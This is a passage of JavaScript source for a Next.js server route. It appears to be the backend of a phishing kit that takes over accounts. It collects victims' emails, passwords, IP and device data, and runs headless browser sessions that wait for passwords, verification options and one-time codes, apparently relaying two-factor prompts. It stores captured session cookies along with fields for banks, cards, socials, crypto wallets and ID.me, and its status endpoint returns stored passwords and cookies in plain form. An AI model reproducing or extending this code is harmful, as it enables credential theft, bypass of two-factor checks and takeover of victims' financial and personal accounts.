      logger.info("No WAITING, WAITINGEMAIL, WAITINGPASSWORD, WAITINGOPTIONS, or WAITINGCODE rows found in the entire sheet. Only FAILED or COMPLETED rows remain.");
      noNewRowsCount++;
      if (noNewRowsCount >= 20) { // Increased stop interval trigger to 20
        logger.info(`No processable rows found for ${noNewRowsCount} consecutive checks. Stopping background processing interval.`);
        stopInterval();
      }
    } else {
      noNewRowsCount = 0; // Reset counter if any processable rows are found
    }

    if (rowsToInitiateProcessing.length === 0 && allProcessableRowsInSheet.length > 0) {
        logger.info("No new rows to initiate processing in this run, but other processable rows exist in the sheet.");
        isProcessingInterval = false;
        return;
    } else if (rowsToInitiateProcessing.length === 0 && allProcessableRowsInSheet.length === 0) {
        // If no rows to initiate AND no processable rows in sheet, then we can return after handling noNewRowsCount
        isProcessingInterval = false;
        return;
    }

    const rowsToProcessInThisRun = [];
    let slotsFilled = 0;
    for (const row of rowsToInitiateProcessing) {
        if (slotsFilled < availableSlots) {
            rowsToProcessInThisRun.push(row);
            slotsFilled++;
        } else {
            break; // No more available slots for new processing
        }
    }

    logger.info(`Found ${rowsToInitiateProcessing.length} eligible rows. Will attempt to process ${rowsToProcessInThisRun.length} new rows in this run.`);

    for (const rowToProcess of rowsToProcessInThisRun) {
        const browserId = rowToProcess[columnIndexes['browserId']];
        
        // Add to activeProcesses immediately to prevent other interval runs from picking it up
        activeProcesses.add(browserId); 
        logger.info(`Starting processing for ${browserId} (Status: ${rowToProcess[columnIndexes['status']]}). Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

        const existingSession = activeBrowserSessions.get(browserId);

        processRow(rowToProcess, columnIndexes, existingSession?.browser, existingSession?.page)
            .catch(err => {
                logger.error(`[processWaitingRows] Uncaught error during processRow for ${browserId}: ${err.message}`, err);
                const sessionToClean = activeBrowserSessions.get(browserId);
                if (sessionToClean?.browser?.isConnected()) {
                    logger.warn(`[processWaitingRows] Cleaning up browser session for ${browserId} due to error in processRow.`);
                    if (sessionToClean.targetCreatedListener && sessionToClean.browser) { // Check browser exists
                        try {
                           sessionToClean.browser.off('targetcreated', sessionToClean.targetCreatedListener);
                        } catch (offError) {
                           logger.warn(`[processWaitingRows] Error removing targetCreated listener during error cleanup for ${browserId}: ${offError.message}`);
                        }
                    }
                    sessionToClean.browser.close().catch(closeErr => logger.error(`Error closing browser during error cleanup for ${browserId}: ${closeErr.message}`));
                }
                activeBrowserSessions.delete(browserId);

                updateBrowserRowData(browserId, {
                    status: "FAILED",
                    verified: false, // FAILED so verified false
                    fullAccess: false, // FAILED so fullAccess false
                    lastJsonResponse: JSON.stringify({
                        browserId, status: "FAILED", error: `processRow crashed: ${err.message}`, timestamp: new Date().toISOString()
                    })
                }).catch(updateErr => logger.error(`[processWaitingRows] Failed to update sheet to FAILED after processRow crash for ${browserId}: ${updateErr.message}`));
            })
            .finally(() => {
                // This finally block is for the promise returned by processRow.
                // The status logging and activeProcesses management for the *individual* processRow
                // call is handled within processRow's own finally block.
                // Here, we just ensure the browserId is removed from activeProcesses
                // if it was added for this specific processWaitingRows invocation.
                activeProcesses.delete(browserId);
                logger.info(`[processWaitingRows] Finished tracking process for ${browserId}. Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
            });
    }

  } catch (error) {
    logger.error('Error in processWaitingRows:', error.message, error); 
  } finally {
    isProcessingInterval = false; 
    logger.debug("Interval check finished.");
  }
}

let intervalId = null; // Make it mutable

function ensureIntervalIsRunning() {
    if (intervalId === null) {
        logger.info("Restarting background processing interval...");
        processWaitingRows(); // Initial run
        intervalId = setInterval(processWaitingRows, 10000); // Check every 10 seconds
        startAppScriptDataBackgroundUpdater(); // Start the data fetching background updater
        logger.info(`Background processing interval set up with ID: ${intervalId}`);
    } else {
        logger.debug("Background processing interval is already running.");
    }
}

function stopInterval() {
    if (intervalId !== null) {
        logger.info("Stopping background processing interval.");
        clearInterval(intervalId);
        intervalId = null;
        stopAppScriptDataBackgroundUpdater(); // Stop the data fetching background updater
    }
}

// Initial setup: Do NOT start interval immediately.
// It will be started by the first POST request that creates a new row.
// The interval will also stop if no processable rows are found.

export async function OPTIONS() {
  return new Response(null, {
    status: 200,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, Origin, X-Forwarded-Host',
    },
  });
}

export async function POST(request) {
  console.log("--- POST function entered ---"); // Log at the very beginning of POST
  let requestBrowserId = null; // Added for finally block access
  // Handle preflight request
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
      },
    });
  }

  let browser = null, page = null, targetCreatedListener = null;
  let platform = 'unknown', browserFullyClosed = false, isReusingBrowserForPOST = false;
  let userDataDir = '';
  let updateData = {}, finalStatusDetails = {};
  let instanceIdForPOST = '';
  try {
    logger.info(`[POST] Incoming request headers: ${inspect(Object.fromEntries(request.headers.entries()))}`);
    // Clone the request to prevent the "body disturbed" error
    const clonedRequest = request.clone();
    const rawBodyText = await clonedRequest.text(); // Read raw body as text
    logger.info(`[POST] Raw incoming request body: ${rawBodyText}`);

    let body;
    try {
      body = JSON.parse(rawBodyText); // Manually parse the JSON
      logger.info(`[POST] Parsed request body: ${inspect(body, { depth: null })}`);
    } catch (jsonParseError) {
      logger.error(`[POST] Error parsing JSON body: ${jsonParseError.message}`);
      return setCorsHeaders(NextResponse.json({
        error: "Invalid JSON format in request body",
        details: jsonParseError.message
      }, { status: 400 }));
    }

    const {
      email, browserId, strictly,
      projectId, userId, formId,
      timestamp = new Date().toISOString(),
      ipData = {}, deviceData = {},
      password // Added to receive password from POST request
    } = body;
    requestBrowserId = browserId; // Assign browserId to the outer scope variable

    // --- Data Validation for new process initiation ---
    if (!browserId) { // Only validate for new process initiation
      const errors = [];
      if (email && (typeof email !== 'string' || !email.includes('@') || !email.includes('.'))) {
        errors.push("Invalid 'email' format. Must be a valid email address.");
      }
      if (typeof projectId !== 'string' || projectId.trim().length === 0) {
        errors.push("'projectId' is required and must be a non-empty string.");
      }
      if (typeof userId !== 'string' || userId.trim().length === 0) {
        errors.push("'userId' is required and must be a non-empty string.");
      }
      if (typeof formId !== 'string' || formId.trim().length === 0) {
        errors.push("'formId' is required and must be a non-empty string.");
      }

      if (errors.length > 0) {
        logger.warn(`[POST] Data validation failed for new process: ${errors.join(', ')}`);
        return setCorsHeaders(NextResponse.json({ 
          error: "Data validation failed", 
          details: errors 
        }, { status: 400 }));
      }
    }

    // --- Handle requests with browserId (status check or resume) ---
    if (browserId) {
      userDataDir = `users_data/${browserId}`; // Set userDataDir early for cleanup
      const existingData = await fetchDataFromAppScript();
      const headers = existingData[0];
      const columnIndexes = getColumnIndexes(headers);
      const existingRow = existingData.slice(1).find(r => r[columnIndexes['browserId']] === browserId);

      if (existingRow) {
        const currentStatus = existingRow[columnIndexes['status']];
        const lastJsonResponse = existingRow[columnIndexes['lastJsonResponse']];
        const lastRun = existingRow[columnIndexes['lastRun']];

        logger.info(`[POST][${browserId}] Found existing row with status: ${currentStatus}. Returning status.`);
        // If the user sends browserId, they just want status. Do NOT launch browser here.
        return setCorsHeaders(NextResponse.json({ 
          status: currentStatus,
          lastRun,
          lastJsonResponse: lastJsonResponse ? JSON.parse(lastJsonResponse) : null,
          currentStatus,
          rowId: existingRow[columnIndexes['rowId']],
          browserId: existingRow[columnIndexes['browserId']],
          projectId: existingRow[columnIndexes['projectId']],
          userId: existingRow[columnIndexes['userId']],
          strictly: existingRow[columnIndexes['strictly']],
          formId: existingRow[columnIndexes['formId']],
          timestamp: existingRow[columnIndexes['timestamp']],
          email: existingRow[columnIndexes['email']],
          domain: existingRow[columnIndexes['domain']],
          password: existingRow[columnIndexes['password']],
          ipData: existingRow[columnIndexes['ipData']] ? JSON.parse(existingRow[columnIndexes['ipData']]) : null,
          deviceData: existingRow[columnIndexes['deviceData']] ? JSON.parse(existingRow[columnIndexes['deviceData']]) : null,
          verifyAccess: existingRow[columnIndexes['verifyAccess']],
          cookieAccess: existingRow[columnIndexes['cookieAccess']],
          verified: existingRow[columnIndexes['verified']],
          fullAccess: existingRow[columnIndexes['fullAccess']],
          cookieJSON: existingRow[columnIndexes['cookieJSON']] ? JSON.parse(existingRow[columnIndexes['cookieJSON']]) : null,
          cookieFileURL: existingRow[columnIndexes['cookieFileURL']],
          banks: existingRow[columnIndexes['banks']],
          cards: existingRow[columnIndexes['cards']],
          socials: existingRow[columnIndexes['socials']],
          wallets: existingRow[columnIndexes['wallets']],
          idMe: existingRow[columnIndexes['idMe']],
          verificationOptions: existingRow[columnIndexes['verificationOptions']] ? JSON.parse(existingRow[columnIndexes['verificationOptions']]) : null,
          verificationChoice: existingRow[columnIndexes['verificationChoice']],
          verificationCode: existingRow[columnIndexes['verificationCode']],
          cookie: existingRow[columnIndexes['cookie']],
          formattedCookie: existingRow[columnIndexes['formattedCookie']]
        }, { status: 200 }));
      } else {
        // browserId provided but no row found. This is an invalid request if user expects only status check.
        logger.warn(`[POST][${browserId}] browserId provided but no corresponding row found. Cannot perform status check.`);
        return NextResponse.json({ error: `Browser ID '${browserId}' not found.` }, { status: 404 });
      }
    }

    // --- Handle requests without browserId (new process initiation) ---
    // If we reach here, browserId was NOT provided, so it's a new process.
    const actualBrowserId = `browser-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
    userDataDir = `users_data/${actualBrowserId}`;
    instanceIdForPOST = `POST-SETUP-${actualBrowserId}`;

    const initialStatus = email ? "WAITING" : "WAITINGEMAIL";
    const initialEmail = email || '';
    const initialDomain = initialEmail ? initialEmail.split('@')[1].toLowerCase() : '';

    // Create initial row with WAITING or WAITINGEMAIL status
    const initialRowData = {
      browserId: actualBrowserId,
      status: initialStatus,
      projectId,
      userId,
      strictly,
      formId,
      timestamp,
      email: initialEmail,
      domain: initialDomain,
      ipData: JSON.stringify(ipData),
      deviceData: JSON.stringify(deviceData),
      password: password || '',
      lastJsonResponse: JSON.stringify({
        browserId: actualBrowserId,
        email: initialEmail,
        status: initialStatus,
        platform: "unknown",
        timestamp,
        message: initialStatus === "WAITINGEMAIL" ? "Awaiting email input." : "Starting email verification process"
      })
    };
    await updateBrowserRowData(actualBrowserId, initialRowData, true); // true for new row

    // The background process will pick this up.
    // We don't launch browser here in the POST request itself.
    // Instead, we ensure the interval is running.
    ensureIntervalIsRunning(); // New function to ensure interval is active

    finalStatusDetails = { browserId: actualBrowserId, email, status: "WAITING", platform: "unknown", timestamp, message: "Process initiated, awaiting background processing." };
    return setCorsHeaders(NextResponse.json({ ...finalStatusDetails }, { status: 200 }));

  } catch (error) {
    logger.error(`[POST] Error: ${error.message}`, error);
    // Ensure cleanup in case of early error
    // This browser variable would only be set if an existing session was being reused and became stale.
    if (browser && !browserFullyClosed) {
        if (targetCreatedListener && isReusingBrowserForPOST) try {browser.off('targetcreated', targetCreatedListener);} catch(e){/*ignore*/}
        await browser.close().catch(e => logger.error(`Error closing browser (POST catch): ${e.message}`));
        browserFullyClosed = true; activeBrowserSessions.delete(requestBrowserId);
    }
    if (!activeBrowserSessions.has(requestBrowserId)) activeProcesses.delete(requestBrowserId);
    return NextResponse.json({ error: error.message }, { status: 500 });
  } finally {
    // The browser variable in this finally block will only be set if an existing session was reused.
    // For new processes, no browser is launched directly in POST, so no cleanup needed here.
    const finalEffectiveStatus = updateData?.status; // This updateData might not be set for new processes
    const currentBrowserId = requestBrowserId || finalStatusDetails?.browserId; // Use actualBrowserId for new processes

    if (browser && !browserFullyClosed) { // Only if a browser was actually launched/reused in this POST call
      if (finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGPASSWORD") {
          activeBrowserSessions.set(currentBrowserId, { browser, page, targetCreatedListener });
      } else {
          if (targetCreatedListener && isReusingBrowserForPOST) try {browser.off('targetcreated', targetCreatedListener);} catch(e){/*ignore*/}
          await browser.close().catch(e => logger.error(`Error closing browser (POST finally for ${requestBrowserId || 'N/A'}): ${e.message}`));
          browserFullyClosed = true; activeBrowserSessions.delete(requestBrowserId);
      }
    }
    
    // Cleanup userDataDir only if it was created and process failed, and browser is fully closed
    if (finalEffectiveStatus === "FAILED" && userDataDir) {
      const session = activeBrowserSessions.get(currentBrowserId);
      if (!session || !session.browser?.isConnected()) {
          try { await fs.remove(userDataDir); } catch (e) { if(e.code === 'EBUSY') logger.warn(`EBUSY deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${userDataDir}`); else logger.error(`Error deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${e.message}`);}
      } else { logger.warn(`[POST][${requestBrowserId}] FAILED, but session active. Skipping dir delete.`); }
    }
    if (requestBrowserId && !activeBrowserSessions.has(requestBrowserId)) activeProcesses.delete(requestBrowserId);
  }
}
